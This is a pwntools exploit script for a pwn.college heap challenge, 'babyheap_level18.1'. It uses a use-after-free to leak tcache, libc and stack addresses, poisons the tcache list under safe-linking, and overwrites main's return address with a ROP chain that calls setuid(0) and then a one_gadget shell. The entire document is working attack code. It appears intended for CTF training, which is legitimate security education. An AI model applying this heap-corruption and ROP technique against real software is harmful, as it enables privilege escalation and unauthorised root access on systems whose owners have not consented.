from pwn import *
from time import sleep
context.binary=e=ELF("./babyheap_level18.1")
libc=e.libc
gs="""
set follow-fork-mode parent
b win
b *main+1780
"""
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gs)
        pause()
elif args.REMOTE:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyheap_level18.1")
if args.DEBUG:
    context.log_level='debug'
def malloc(idx: int,size: int):
    p.sendlineafter(b"[*] Function",b"malloc")
    p.sendlineafter(b"Index: ",str(idx).encode())
    p.sendlineafter(b"Size: ",str(size).encode())
def free(idx: int):
    p.sendlineafter(b"[*] Function",b"free")
    p.sendlineafter(b"Index: ",str(idx).encode())
def puts(idx: int):
    p.sendlineafter(b"[*] Function",b"puts")
    p.sendlineafter(b"Index: ",str(idx).encode())
    p.recvuntil(b"Data: ")
    return p.recvuntil(b"\n").rstrip()
def scanf(idx: int,buffer: bytes):
    p.sendlineafter(b"[*] Function",b"scanf")
    p.sendlineafter(b"Index: ",str(idx).encode())
    p.sendline(buffer)
    sleep(0.5)
malloc(0,0x78)
free(0)
leaked1=int(puts(0)[::-1].hex(),16)
tcache= (leaked1 << 12)+0x10
pos0= tcache+0x290+0x20
log.info(f"tcache @ {hex(tcache)}")
log.info(f"pos0 @ {hex(pos0)}")
scanf(0,p64(0)*2)
free(0)
scanf(0,p64((pos0 >> 12 ) ^ tcache))
malloc(0,0x78)
malloc(1,0x78)
scanf(1,p16(7)*7+p16(0)*32+p16(7))
free(1)
libc.address=int(puts(1)[:6][::-1].hex(),16)-0x219ce0
log.info(f"libc @ {hex(libc.address)}")
malloc(1,0xa8)
malloc(2,0xa8)
scanf(1,p16(7)*7+p16(0)*32+p16(7))
scanf(2,p64(libc.sym.environ))
malloc(3,0x78)
leak_stack=int(puts(3)[:6][::-1].hex(),16)
log.info(f"leak stack: {hex(leak_stack)}")
ptr=leak_stack-0x308
main_ret=leak_stack-0x120
scanf(2,p64(ptr))
sleep(1)
malloc(4,0x78)
scanf(4,p64(main_ret))
rdi_ret=libc.address+0x000000000002a3e5
rsi_ret=libc.address+0x000000000002be51
rbp_ret=libc.address+0x000000000002a2e0
scanf(0,
      p64(rdi_ret)+p64(0)+
      p64(libc.sym.setuid)+
      p64(rsi_ret)+p64(0)+
      p64(rbp_ret)+p64(pos0+0x78)+
      p64(libc.address+0xebcf8))
sleep(1)
p.sendlineafter(b"[*] Function",b"quit")
p.interactive()